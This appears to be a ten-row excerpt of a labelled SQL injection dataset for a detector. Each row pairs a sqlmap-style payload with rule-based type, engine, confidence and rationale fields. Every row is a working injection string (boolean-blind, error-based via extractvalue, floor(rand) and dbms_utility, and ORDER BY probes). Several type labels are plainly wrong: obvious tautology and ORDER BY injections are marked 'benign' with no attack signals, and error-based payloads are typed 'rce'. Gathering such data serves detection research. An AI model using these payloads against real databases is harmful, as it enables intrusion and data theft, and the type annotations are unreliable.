row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
2910,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""hrkf"" like ""hrkf",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2911,-9358' or 9887 = 2569--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2912,"1"" ) as evoq where 8193 = 8193 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,,boolean_blind,generic,0.95,8193 = 8193 or detected — boolean_blind injection (priority 8) on generic,rule-based
2913,-7426' order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2914,"1 ) ) as dnwj where 2961 = 2961 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,2961 = 2961 and detected — boolean_blind injection (priority 8) on generic,rule-based
2915,-9264' ) or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
2916,-5291' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'tmpm' = 'tmpm,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
2917,"-4015"" where 2610 = 2610 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2918,"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
2919,1' ) ) ) and 7533 = 7533 and ( ( ( 'suzd' like 'suzd,1,,boolean_blind,generic,0.95,"7533 = 7533 and, like ' detected — boolean_blind injection (priority 8) on generic",rule-based
